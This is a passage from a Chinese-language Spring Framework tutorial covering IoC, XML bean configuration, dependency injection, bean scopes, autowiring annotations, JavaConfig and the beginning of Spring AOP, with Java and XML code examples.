&lt;/bean&gt;&lt;/beans&gt; 测试 12345678910public class MyTest &#123; public static void main(String[] args) &#123; //获取Spring的上下文对象！ ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); //我们的对象现在都在Spring中的管理了，我们需要使用，直接去里面取出来就可以！ Hello hello = (Hello) context.getBean(&quot;hello&quot;); System.out.println(hello.toString()); &#125;&#125; 可以发现我们没有用 new 关键字来创建 Hello 对象，而是由Spring创建的，Hello对象的属性是由Spring容器设置的。 这个过程就叫控制反转： 控制：谁来控制对象的创建，传统应用程序的对象是由程序本身控制创建的，使用Spring后，对象是由Spring来创建的。 反转：程序本身不创建对象，而变成被动的接收对象。 依赖注入：就是利用set方法来进行注入的。 IOC是一种编程思想，由主动的编程变成被动的接收。 我们用这种方式来实现数据库那个案例 12345678&lt;bean id=&quot;MysqlImpl&quot; class=&quot;com.she11F.dao.UserDaoMySqlImpl&quot;&gt;&lt;/bean&gt;&lt;bean id=&quot;ServiceImpl&quot; class=&quot;com.she11F.service.UserServiceImpl&quot;&gt; &lt;!--注意: 这里的name并不是属性 , 而是set方法后面的那部分 , 首字母小写--&gt; &lt;!--引用另外一个bean , 不是用value 而是用 ref--&gt; &lt;property name=&quot;userDao&quot; ref=&quot;MysqlImpl&quot;&gt;&lt;/property&gt;&lt;/bean&gt; 1234567public class MyTest &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); UserServiceImpl serviceImpl = (UserServiceImpl) context.getBean(&quot;ServiceImpl&quot;); serviceImpl.getUser(); &#125;&#125; 到了现在，我们彻底不用在程序中去改动了，要实现不同的操作，只需要在xml配置文件中进行修改，所谓的IOC，一句话搞定：对象由Spring来创建，管理，装配！ IOC创建对象方式通过上面配置 xml 然后 spring 容器直接获取对象我们感受到了 spring 的优越性，但是我不禁要问，为什么呢？为什么能直接获取对象，常言道 “当你感受岁月静好之时，一定有人在替你负重前行”，没错，其实是 spring 在偷偷实例化 通过无参构造方法来创建User.java 123456789101112public class User &#123; private String name; public User() &#123; System.out.println(&quot;user无参构造方法&quot;); &#125; public void setName(String name) &#123; this.name = name; &#125; public void show()&#123; System.out.println(&quot;name=&quot;+ name ); &#125;&#125; beans.xml 123&lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;she11F&quot;&gt;&lt;/property&gt;&lt;/bean&gt; 测试类 12345678@Testpublic void test()&#123; ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); //在执行getBean的时候, user已经创建好了 , 通过无参构造 User user = (User) context.getBean(&quot;user&quot;); //调用对象的方法 . user.show();&#125; 结果可以发现，在调用show方法之前，User对象已经通过无参构造初始化了！ 通过有参构造方法来创建UserT.java 123456789101112public class UserT &#123; private String name; public UserT(String name) &#123; this.name = name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void show()&#123; System.out.println(&quot;name=&quot;+ name ); &#125;&#125; beans.xml 有三种方式编写 12345&lt;!-- 第一种根据index参数下标设置 --&gt;&lt;bean id=&quot;userT&quot; class=&quot;com.kuang.pojo.UserT&quot;&gt; &lt;!-- index指构造方法 , 下标从0开始 --&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;she11F&quot;/&gt;&lt;/bean&gt; 12345&lt;!-- 第二种根据参数名字设置，最推荐 --&gt;&lt;bean id=&quot;userT&quot; class=&quot;com.kuang.pojo.UserT&quot;&gt; &lt;!-- name指参数名 --&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;she11F&quot;/&gt;&lt;/bean&gt; 1234&lt;!-- 第三种根据参数类型设置,不推荐 --&gt;&lt;bean id=&quot;userT&quot; class=&quot;com.kuang.pojo.UserT&quot;&gt; &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;she11F&quot;/&gt;&lt;/bean&gt; 结论：在配置文件加载的时候。其中管理的对象都已经初始化了！ Spring配置别名alias 设置别名 , 为bean设置别名 , 可以设置多个别名 12&lt;!--设置别名：在获取Bean的时候可以使用别名获取--&gt;&lt;alias name=&quot;userT&quot; alias=&quot;userNew&quot;/&gt; Bean的配置1234567891011&lt;!--bean就是java对象,由Spring创建和管理--&gt;&lt;!-- id 是bean的标识符,要唯一,如果没有配置id,name就是默认标识符 如果配置id,又配置了name,那么name是别名 name可以设置多个别名,可以用逗号,分号,空格隔开 如果不配置id和name,可以根据applicationContext.getBean(.class)获取对象; class是bean的全限定名=包名+类名--&gt;&lt;bean id=&quot;hello&quot; name=&quot;hello2 h2,h3;h4&quot; class=&quot;com.kuang.pojo.Hello&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;Spring&quot;/&gt;&lt;/bean&gt; import团队的合作通过import来实现 . 1&lt;import resource=&quot;&#123;path&#125;/beans.xml&quot;/&gt; 依赖注入（DI） 依赖注入（Dependency Injection,DI）。 依赖 : 指 Bean 对象的创建依赖于容器 . Bean对象的依赖资源 . 注入 : 指 Bean 对象所依赖的资源 , 由容器来设置和装配 . 构造器注入前面的案例有 set注入 (重点)要求被注入的属性 , 必须有set方法 , set方法的方法名由set + 属性首字母大写 , 如果属性是boolean类型 , 没有set方法 , 是 is . 测试pojo类 : Address.java 1234567891011package com.she11F.pojo;public class Address &#123; private String address; public String getAddress() &#123; return address; &#125; public void setAddress(String address) &#123; this.address = address; &#125;&#125; Student 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.she11F.pojo;import java.util.List;import java.util.Map;import java.util.Properties;import java.util.Set;public class Student &#123; private String name; private Address address; private String[] books; private List&lt;String&gt; hobbys; private Map&lt;String,String&gt; card; private Set&lt;String&gt; games; private String wife; private Properties info; public void setName(String name) &#123; this.name = name; &#125; public void setAddress(Address address) &#123; this.address = address; &#125; public void setBooks(String[] books) &#123; this.books = books; &#125; public void setHobbys(List&lt;String&gt; hobbys) &#123; this.hobbys = hobbys; &#125; public void setCard(Map&lt;String, String&gt; card) &#123; this.card = card; &#125; public void setGames(Set&lt;String&gt; games) &#123; this.games = games; &#125; public void setWife(String wife) &#123; this.wife = wife; &#125; public void setInfo(Properties info) &#123; this.info = info; &#125; public String getName() &#123; return name; &#125; public void show()&#123; System.out.println(&quot;name=&quot;+ name + &quot;,address=&quot;+ address.getAddress() + &quot;,books=&quot; ); for (String book:books)&#123; System.out.print(&quot;&lt;&lt;&quot;+book+&quot;&gt;&gt;\\t&quot;); &#125; System.out.println(&quot; 爱好:&quot;+hobbys); System.out.println(&quot;card:&quot;+card); System.out.println(&quot;games:&quot;+games); System.out.println(&quot;wife:&quot;+wife); System.out.println(&quot;info:&quot;+info); &#125;&#125; 常量注入 123&lt;bean id=&quot;student&quot; class=&quot;com.kuang.pojo.Student&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;小明&quot;/&gt;&lt;/bean&gt; Bean注入 &#x3D;&#x3D;注意点：这里的值是一个引用，ref&#x3D;&#x3D; 1&lt;property name=&quot;address&quot; ref=&quot;addr&quot;/&gt; 数组注入 1234567891011&lt;bean id=&quot;student&quot; class=&quot;com.she11F.pojo.Student&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;小明&quot;/&gt; &lt;property name=&quot;address&quot; ref=&quot;addr&quot;/&gt; &lt;property name=&quot;books&quot;&gt; &lt;array&gt; &lt;value&gt;西游记&lt;/value&gt; &lt;value&gt;红楼梦&lt;/value&gt; &lt;value&gt;水浒传&lt;/value&gt; &lt;/array&gt; &lt;/property&gt;&lt;/bean&gt; List注入 1234567&lt;property name=&quot;hobbys&quot;&gt; &lt;list&gt; &lt;value&gt;听歌&lt;/value&gt; &lt;value&gt;看电影&lt;/value&gt; &lt;value&gt;爬山&lt;/value&gt; &lt;/list&gt;&lt;/property&gt; Map注入 123456&lt;property name=&quot;card&quot;&gt; &lt;map&gt; &lt;entry key=&quot;中国邮政&quot; value=&quot;456456456465456&quot;/&gt; &lt;entry key=&quot;建设&quot; value=&quot;1456682255511&quot;/&gt; &lt;/map&gt;&lt;/property&gt; set注入 1234567&lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;LOL&lt;/value&gt; &lt;value&gt;BOB&lt;/value&gt; &lt;value&gt;COC&lt;/value&gt; &lt;/set&gt;&lt;/property&gt; Null注入 1&lt;property name=&quot;wife&quot;&gt;&lt;null/&gt;&lt;/property&gt; Properties注入 1234567&lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;学号&quot;&gt;20190604&lt;/prop&gt; &lt;prop key=&quot;性别&quot;&gt;男&lt;/prop&gt; &lt;prop key=&quot;姓名&quot;&gt;小明&lt;/prop&gt; &lt;/props&gt;&lt;/property&gt; 跑出结果如图所示 拓展注入实现User.java ： 【注意：这里没有有参构造器！】 1234567891011121314151617public class User &#123; private String name; private int age; public void setName(String name) &#123; this.name = name; &#125; public void setAge(int age) &#123; this.age = age; &#125; @Override public String toString() &#123; return &quot;User&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &#x27;&#125;&#x27;; &#125;&#125; 1、P命名空间注入 : 需要在头文件中加入约束文件 123导入约束 : xmlns:p=&quot;http://www.springframework.org/schema/p&quot;&lt;!--P(属性: properties)命名空间 , 属性依然要设置set方法--&gt;&lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot; p:name=&quot;she11f&quot; /&gt; 2、c 命名空间注入 : 需要在头文件中加入约束文件 123导入约束 : xmlns:c=&quot;http://www.springframework.org/schema/c&quot;&lt;!--C(构造: Constructor)命名空间 , 属性依然要设置set方法--&gt;&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot; c:name=&quot;she11f&quot; c:age=&quot;18&quot;/&gt; 发现问题：爆红了，刚才我们没有写有参构造！ 解决：把有参构造器加上，这里也能知道，c 就是所谓的构造器注入！ Bean的作用域 在Spring中，那些组成应用程序的主体及由Spring IoC容器所管理的对象，被称之为bean。简单地讲，bean就是由IoC容器初始化、装配及管理的对象 . 几种作用域中，request、session作用域仅在基于web的应用中使用（不必关心你所采用的是什么web应用框架），只能用在基于web的Spring ApplicationContext环境。 Singleton 当一个bean的作用域为Singleton，那么Spring IoC容器中只会存在一个共享的bean实例，并且所有对bean的请求，只要id与该bean定义相匹配，则只会返回bean的同一实例。Singleton是单例类型，就是在创建起容器时就同时自动创建了一个bean的对象，不管你是否使用，他都存在了，每次获取到的对象都是同一个对象。注意，Singleton作用域是Spring中的缺省作用域。要在XML中将bean定义成singleton，可以这样配置： 1&lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot; c:name=&quot;she11f&quot; c:age=&quot;20&quot; scope=&quot;singleton&quot;/&gt; 测试： 123User user1 = (User) context.getBean(&quot;user&quot;);User user2 = (User) context.getBean(&quot;user&quot;);System.out.println(user1 == user2); 返回 true Prototype 当一个bean的作用域为Prototype，表示一个bean定义对应多个对象实例。Prototype作用域的bean会导致在每次对该bean请求（将其注入到另一个bean中，或者以程序的方式调用容器的getBean()方法）时都会创建一个新的bean实例。Prototype是原型类型，它在我们创建容器的时候并没有实例化，而是当我们获取bean的时候才会去创建一个对象，而且我们每次获取到的对象都不是同一个对象。根据经验，对有状态的bean应该使用prototype作用域，而对无状态的bean则应该使用singleton作用域。在XML中将bean定义成prototype，可以这样配置： 123scope=&quot;prototype&quot;或者singleton=&quot;false&quot; Request 当一个bean的作用域为Request，表示在一次HTTP请求中，一个bean定义对应一个实例；即每个HTTP请求都会有各自的bean实例，它们依据某个bean定义创建而成。该作用域仅在基于web的Spring ApplicationContext情形下有效。考虑下面bean定义： 1scope=&quot;request&quot; 针对每次HTTP请求，Spring容器会根据loginAction bean的定义创建一个全新的LoginAction bean实例，且该loginAction bean实例仅在当前HTTP request内有效，因此可以根据需要放心的更改所建实例的内部状态，而其他请求中根据loginAction bean定义创建的实例，将不会看到这些特定于某个请求的状态变化。当处理请求结束，request作用域的bean实例将被销毁。 Session 当一个bean的作用域为Session，表示在一个HTTP Session中，一个bean定义对应一个实例。该作用域仅在基于web的Spring ApplicationContext情形下有效。考虑下面bean定义： 1scope=&quot;session&quot; 针对某个HTTP Session，Spring容器会根据userPreferences bean定义创建一个全新的userPreferences bean实例，且该userPreferences bean仅在当前HTTP Session内有效。与request作用域一样，可以根据需要放心的更改所创建实例的内部状态，而别的HTTP Session中根据userPreferences创建的实例，将不会看到这些特定于某个HTTP Session的状态变化。当HTTP Session最终被废弃的时候，在该HTTP Session作用域内的bean也会被废弃掉。 Bean的自动装配 自动装配是使用spring满足bean依赖的一种方法 spring会在应用上下文中为某个bean寻找其依赖的bean。 Spring中bean有三种装配机制，分别是： 在xml中显式配置； 在java中显式配置； 隐式的bean发现机制和自动装配。 这里我们主要讲第三种：自动化的装配bean。 Spring的自动装配需要从两个角度来实现，或者说是两个操作： 组件扫描(component scanning)：spring会自动发现应用上下文中所创建的bean； 自动装配(autowiring)：spring自动满足bean之间的依赖，也就是我们说的IoC&#x2F;DI； 组件扫描和自动装配组合发挥巨大威力，使的显示的配置降低到最少。 测试环境搭建新建两个实体类，Cat Dog 都有一个叫的方法 12345public class Cat &#123; public void shout() &#123; System.out.println(&quot;miao~&quot;); &#125;&#125; 12345public class Dog &#123; public void shout() &#123; System.out.println(&quot;wang~&quot;); &#125;&#125; 新建一个用户类 User 12345public class User &#123; private Cat cat; private Dog dog; private String str;&#125; 编写Spring配置文件 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;dog&quot; class=&quot;com.she11F.pojo.Dog&quot;/&gt; &lt;bean id=&quot;cat&quot; class=&quot;com.she11F.pojo.Cat&quot;/&gt; &lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot;&gt; &lt;property name=&quot;cat&quot; ref=&quot;cat&quot;/&gt; &lt;property name=&quot;dog&quot; ref=&quot;dog&quot;/&gt; &lt;property name=&quot;str&quot; value=&quot;qinjiang&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; 正常的 xml 注入我们就不讲了，看看自动化装配 byNameautowire byName (按名称自动装配) 123&lt;!--byName：会自动在容器上下文中查找，和自己对象set方法后面的值对应的bean id！ --&gt; 由于在手动配置xml过程中，常常发生字母缺漏和大小写等错误，而无法对其进行检查，使得开发效率降低。 采用自动装配将避免这些错误，并且使配置简单化。 测试： 修改bean配置，增加一个属性 autowire&#x3D;”byName” 123&lt;bean id=&quot;user&quot; class=&quot;com.she11f.pojo.User&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;she11f&quot;/&gt;&lt;/bean&gt; 1234567891011&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;dog&quot; class=&quot;com.she11F.pojo.Dog&quot;/&gt; &lt;bean id=&quot;cat&quot; class=&quot;com.she11F.pojo.Cat&quot;/&gt; &lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;she11f&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; 再次测试，结果依旧成功输出！ 我们将 cat 的bean id修改为 catXXX 再次测试， 执行时报空指针java.lang.NullPointerException。因为按byName规则找不对应set方法，真正的setCat就没执行，对象就没有初始化，所以调用时就会报空指针错误。 小结： 当一个bean节点带有 autowire byName的属性时。 将查找其类中所有的set方法名，例如setCat，获得将set去掉并且首字母小写的字符串，即cat。 去spring容器中寻找是否有此字符串名称id的对象。 如果有，就取出注入；如果没有，就报空指针异常。 byTypeautowire byType (按类型自动装配) 123&lt;!--byType：会自动在容器上下文中查找，和自己对象属性类型相同的bean！ --&gt; 使用autowire byType首先需要保证：同一类型的对象，在spring容器中唯一。如果不唯一，会报不唯一的异常。 1NoUniqueBeanDefinitionException 测试： 将user的bean配置修改一下 ： autowire=&quot;byType&quot; 测试，正常输出 再注册一个cat 的bean对象！ 测试，报错：NoUniqueBeanDefinitionException 删掉cat2，将cat的bean名称改掉！测试！因为是按类型装配，所以并不会报异常，也不影响最后的结果。甚至将id属性去掉，也不影响结果。 这就是按照类型自动装配！ 使用注解dk1.5开始支持注解，spring2.5开始全面支持注解。 准备工作： 利用注解的方式注入属性。 在spring配置文件中引入context文件头 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;!--开启注解的支持 --&gt; &lt;context:annotation-config/&gt;&lt;/beans&gt; @Autowired @Autowired是按类型自动转配的，不支持id匹配。 需要导入 spring-aop的包！ 测试： 将User类中的set方法去掉，使用@Autowired注解 12345678910111213141516public class User &#123; @Autowired private Cat cat; @Autowired private Dog dog; private String str; public Cat getCat() &#123; return cat; &#125; public Dog getDog() &#123; return dog; &#125; public String getStr() &#123; return str; &#125;&#125; @Autowired(required&#x3D;false) 说明： false，对象可以为null；true，对象必须存对象，不能为null。 123//如果允许对象为null，设置required = false,默认为true@Autowired(required = false)private Cat cat; @Qualifier @Autowired是根据类型自动装配的，加上@Qualifier则可以根据byName的方式自动装配 @Qualifier不能单独使用。 如果@Autowired自动装配的环境比较复杂，自动装配无法通过一个注解【@Autowired】完成的时候，我们可以使用@Qualifier(value &#x3D; “xxx”)去配置@Autowired的使用，指定一个唯一的bean对象注入！ 测试实验步骤： 配置文件修改内容，保证类型存在对象。且名字不为类的默认名字！ 1234567&lt;bean id=&quot;dog1&quot; class=&quot;com.she11F.pojo.Dog&quot;/&gt;&lt;bean id=&quot;dog2&quot; class=&quot;com.she11F.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat1&quot; class=&quot;com.she11F.pojo.Cat&quot;/&gt;&lt;bean id=&quot;cat2&quot; class=&quot;com.she11F.pojo.Cat&quot;/&gt;&lt;bean id=&quot;user&quot; class=&quot;com.she11F.pojo.User&quot; &gt; &lt;property name=&quot;str&quot; value=&quot;she11f&quot;/&gt;&lt;/bean&gt; 没有加Qualifier测试，直接报错 在属性上添加Qualifier注解 123456@Autowired@Qualifier(value = &quot;cat2&quot;)private Cat cat;@Autowired@Qualifier(value = &quot;dog2&quot;)private Dog dog; @Resource @Resource如有指定的name属性，先按该属性进行byName方式查找装配； 其次再进行默认的byName方式进行装配； 如果以上都不成功，则按byType的方式自动装配。 都不成功，则报异常。 实体类： 12345678public class User &#123; //如果允许对象为null，设置required = false,默认为true @Resource(name = &quot;cat2&quot;) private Cat cat; @Resource private Dog dog; private String str;&#125; 1234&lt;bean id=&quot;dog&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat1&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;cat2&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot;/&gt; 测试：结果OK 配置文件2：beans.xml ， 删掉cat2 12&lt;bean id=&quot;dog&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat1&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt; 实体类上只保留注解 1234@Resourceprivate Cat cat;@Resourceprivate Dog dog; 结果：OK 结论：先进行byName查找，失败；再进行byType查找，成功。 @Autowired与@Resource异同： @Autowired与@Resource都可以用来装配bean。都可以写在字段上，或写在setter方法上。 @Autowired默认按类型装配（属于spring规范），默认情况下必须要求依赖对象必须存在，如果要允许null 值，可以设置它的required属性为false，如：@Autowired(required&#x3D;false) ，如果我们想使用名称装配可以结合@Qualifier注解进行使用 @Resource（属于J2EE复返），默认按照名称进行装配，名称可以通过name属性进行指定。如果没有指定name属性，当注解写在字段上时，默认取字段名进行按照名称查找，如果注解写在setter方法上默认取属性名进行装配。 当找不到与名称匹配的bean时才按照类型进行装配。但是需要注意的是，如果name属性一旦指定，就只会按照名称进行装配。 它们的作用相同都是用注解方式注入对象，但执行顺序不同。@Autowired先byType，@Resource先byName。 使用注解开发在spring4之后，想要使用注解形式，必须得要引入aop的包 使用注解需要导入约束，配置注解的支持！ 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;&lt;/beans&gt; Bean的实现我们之前都是使用 bean 的标签进行bean注入，但是实际开发中，我们一般都会使用注解！ 配置扫描哪些包下的注解 12&lt;!--指定注解扫描包--&gt; &lt;context:component-scan base-package=&quot;com.she11F.pojo&quot;/&gt; 在指定包下编写类，增加注解 12345@Component(&quot;user&quot;)// 相当于配置文件中 &lt;bean id=&quot;user&quot; class=&quot;当前注解的类&quot;/&gt;public class User &#123; public String name = &quot;she11F&quot;;&#125; 属性注入使用注解注入属性 可以不用提供set方法，直接在直接名上添加@value(“值”) 1234567@Component(&quot;user&quot;)// 相当于配置文件中 &lt;bean id=&quot;user&quot; class=&quot;当前注解的类&quot;/&gt;public class User &#123; @Value(&quot;she11F&quot;) // 相当于配置文件中 &lt;property name=&quot;name&quot; value=&quot;she11F&quot;/&gt; public String name;&#125; 衍生注解我们这些注解，就是替代了在配置文件当中配置步骤而已！更加的方便快捷！ @Component三个衍生注解 为了更好的进行分层，Spring可以使用其它三个注解，功能一样，目前使用哪一个功能都一样。 @Controller：web层 @Service：service层 @Repository：dao层 写上这些注解，就相当于将这个类交给Spring管理装配了！ 自动装配注解在Bean的自动装配已经讲过了，可以回顾！ 作用域@scope singleton：默认的，Spring会采用单例模式创建这个对象。关闭工厂 ，所有的对象都会销毁。 prototype：多例模式。关闭工厂 ，所有的对象不会销毁。内部的垃圾回收机制会回收 123456@Controller(&quot;user&quot;)@Scope(&quot;prototype&quot;)public class User &#123; @Value(&quot;she11F&quot;) public String name;&#125; XML与注解比较 XML可以适用任何场景 ，结构清晰，维护方便 注解不是自己提供的类使用不了，开发简单方便 xml与注解整合开发 ：推荐最佳实践 xml管理Bean 注解完成属性注入 使用过程中， 可以不用扫描，扫描是为了类上的注解 1&lt;context:annotation-config/&gt; 作用： 进行注解驱动注册，从而使注解生效 用于激活那些已经在spring容器里注册过的bean上面的注解，也就是显示的向Spring注册 如果不扫描包，就需要手动配置bean 如果不加注解驱动，则注入的值为null！ 基于 Java 类进行配置 SpringJavaConfig 原来是 Spring 的一个子项目，它通过 Java 类的方式提供 Bean 的定义信息，在 Spring4 的版本， JavaConfig 已正式成为 Spring4 的核心功能 。 12345@Component //将这个类标注为Spring的一个组件，放到容器中！public class User &#123; @Value(&quot;she11F&quot;) public String name;&#125; 这里 @Component 这个注解的意思，就是说明这个类被Spring接管了，注册到了容器中 新建一个 config 配置包，编写一个MyConfig配置类 1234567@Configuration //代表这是一个配置类public class MyConfig &#123; @Bean //通过方法注册一个bean，这里的返回值就Bean的类型，方法名就是bean的id！ public User user()&#123; return new User(); &#125;&#125; 测试类 123ApplicationContext context = new AnnotationConfigApplicationContext(MyConfig.class); User user = (User) context.getBean(&quot;user&quot;); System.out.println(user.name); 导入其他配置如何做呢？ 我们再编写一个配置类！ 123@Configuration //代表这是一个配置类public class MyConfig2 &#123;&#125; 在之前的配置类中我们来选择导入这个配置类 12345678@Configuration@Import(MyConfig2.class) //导入合并其他配置类，类似于配置文件中的 inculde 标签public class MyConfig &#123; @Bean public Dog dog()&#123; return new Dog(); &#125;&#125; 关于这种Java类的配置方式，我们在之后的SpringBoot 和 SpringCloud中还会大量看到，我们需要知道这些注解的作用即可！ AOPAOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。 Aop在Spring中的作用&#x3D;&#x3D;提供声明式事务；允许用户自定义切面&#x3D;&#x3D; 横切关注点：跨越应用程序多个模块的方法或功能。即是，与我们业务逻辑无关的，但是我们需要关注的部分，就是横切关注点。如日志 , 安全 , 缓存 , 事务等等 …. 切面（ASPECT）：横切关注点 被模块化 的特殊对象。即，它是一个类。 通知（Advice）：切面必须要完成的工作。即，它是类中的一个方法。 目标（Target）：被通知对象。 代理（Proxy）：向目标对象应用通知之后创建的对象。 切入点（PointCut）：切面通知 执行的 “地点”的定义。 连接点（JointPoint）：与切入点匹配的执行点。 SpringAOP中，通过Advice定义横切逻辑，Spring中支持5种类型的Advice: 即 Aop 在 不改变原有代码的情况下 , 去增加新的功能 . 通过 Spring API 实现【重点】使用AOP织入，需要导入一个依赖包！ 123456&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.4&lt;/version&gt;&lt;/dependency&gt; 第一种方式 通过 Spring API 实现 首先编写我们的业务接口和实现类 123456public interface UserService &#123; public void add(); public void delete(); public void update(); public void search();&#125; 123456789101112131415161718public class UserServiceImpl implements UserService&#123; @Override public void add() &#123; System.out.println(&quot;增加用户&quot;); &#125; @Override public void delete() &#123; System.out.println(&quot;删除用户&quot;); &#125; @Override public void update() &#123; System.out.println(&quot;更新用户&quot;); &#125; @Override public void search() &#123; System.out.println(&quot;查询用户&quot;); &#125;&#125; 然后去写我们的增强类 , 我们编写两个 , 一个前置增强 一个后置增强 123456789public class Log implements MethodBeforeAdvice &#123; //method : 要执行的目标对象的方法 //objects : 被调用的方法的参数 //Object : 目标对象 @Override public void before(Method method, Object[] objects, Object o) throws Throwable &#123; System.out.println( o.getClass().getName() + &quot;的&quot; + method.getName() + &quot;方法被执行了&quot;); &#125;&#125; 123456789101112public class AfterLog implements AfterReturningAdvice &#123; //returnValue 返回值 //method被调用的方法 //args 被调用的方法的对象的参数 //target 被调用的目标对象 @Override public void afterReturning(Object returnValue, Method method, Object[] args, Object target) throws Throwable &#123; System.out.println(&quot;执行了&quot; + target.getClass().getName() +&quot;的&quot;+method.getName()+&quot;方法,&quot; +&quot;返回值：&quot;+returnValue); &#125;&#125; 最后去spring的文件中注册 , 并实现aop切入实现 , 注意导入约束 . 123456789101112131415161718192021&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd&quot;&gt; &lt;!--注册bean--&gt; &lt;bean id=&quot;userService&quot; class=&quot;com.she11F.service.UserServiceImpl&quot;/&gt; &lt;bean id=&quot;log&quot; class=&quot;com.she11F.log.Log&quot;/&gt; &lt;bean id=&quot;afterLog&quot; class=&quot;com.she11F.log.AfterLog&quot;/&gt; &lt;!--aop的配置--&gt; &lt;aop:config&gt; &lt;!--切入点 expression:表达式匹配要执行的方法--&gt; &lt;aop:pointcut id=&quot;pointcut&quot; expression=&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;/&gt; &lt;!--执行环绕; advice-ref执行方法 . pointcut-ref切入点--&gt; &lt;aop:advisor advice-ref=&quot;log&quot; pointcut-ref=&quot;pointcut&quot;/&gt; &lt;aop:advisor advice-ref=&quot;afterLog&quot; pointcut-ref=&quot;pointcut&quot;/&gt; &lt;/aop:config&gt;&lt;/beans&gt; 第二种方式 自定义类来实现Aop 目标业务类不变依旧是userServiceImpl 第一步 : 写我们自己的一个切入类 12345678public class DiyPointcut &#123; public void before()&#123; System.out.println(&quot;---------方法执行前---------&quot;); &#125; public void after()&#123; System.out.println(&quot;---------方法执行后---------&quot;); &#125;&#125; 去spring中配置 12345678910111213&lt;!--第二种方式自定义实现--&gt;&lt;!--注册bean--&gt;&lt;bean id=&quot;diy&quot; class=&quot;com.she11F.diy.DiyPointcut&quot;/&gt;&lt;bean id=&quot;userService&quot; class=&quot;com.she11F.service.UserServiceImpl&quot;/&gt;&lt;!--aop的配置--&gt;&lt;aop:config&gt; &lt;!--第二种方式：使用AOP的标签实现--&gt; &lt;aop:aspect ref=&quot;diy&quot;&gt; &lt;aop:pointcut id=&quot;diyPonitcut&quot; expression=&quot;execution(* com.she11F.service.UserServiceImpl.*(..))&quot;/&gt; 